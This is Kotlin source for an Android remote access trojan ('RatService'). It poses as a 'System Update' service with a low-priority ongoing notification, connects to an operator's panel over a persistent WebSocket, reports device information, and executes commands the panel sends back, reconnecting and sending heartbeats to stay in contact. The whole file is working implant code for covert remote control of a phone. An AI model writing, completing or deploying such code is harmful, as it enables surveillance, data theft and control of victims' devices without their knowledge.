package com.system.update

import android.app.*
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.JsonObject
import okhttp3.*
import java.util.concurrent.TimeUnit

class RatService : Service() {
    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(20, TimeUnit.SECONDS)
        .build()
    private var ws: WebSocket? = null
    private val gson = Gson()
    private var deviceId: String = ""
    private var running = true
    private lateinit var handler: CommandHandler

    override fun onCreate() {
        super.onCreate()
        deviceId = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"
        handler = CommandHandler(this, deviceId)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, buildNotification())
        connect()
        startHeartbeat()
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Service berjalan")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun connect() {
        val cfg = App.config
        val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=${cfg.username}"
        val req = Request.Builder().url(url).build()
        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                sendInfo(webSocket)
            }
            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val obj = gson.fromJson(text, JsonObject::class.java)
                    if (obj.get("type")?.asString == "command") {
                        val id = obj.get("id").asLong
                        val cmd = obj.get("command").asString
                        val args = obj.getAsJsonObject("args")
                        handler.execute(cmd, args) { result ->
                            val payload = JsonObject().apply {
                                addProperty("type", "result")
                                addProperty("commandId", id)
                                add("result", gson.toJsonTree(result))
                            }
                            webSocket.send(gson.toJson(payload))
                        }
                    }
                } catch (_: Exception) {}
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                if (running) {
                    Thread.sleep(App.config.reconnectDelayMs)
                    connect()
                }
            }
            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                if (running) {
                    Thread.sleep(App.config.reconnectDelayMs)
                    connect()
                }
            }
        })
    }

    private fun sendInfo(socket: WebSocket) {
        val payload = JsonObject().apply {
            addProperty("type", "info")
            add("info", gson.toJsonTree(handler.collectInfo()))
        }
        socket.send(gson.toJson(payload))
    }

    private fun startHeartbeat() {
        Thread {
            while (running) {
                try {
                    ws?.send(gson.toJson(mapOf("type" to "heartbeat")))
                    Thread.sleep(App.config.heartbeatMs)
                } catch (_: Exception) {}
            }
        }.start()
    }

    override fun onDestroy() {
        running = false
        try { ws?.close(1000, "stop") } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
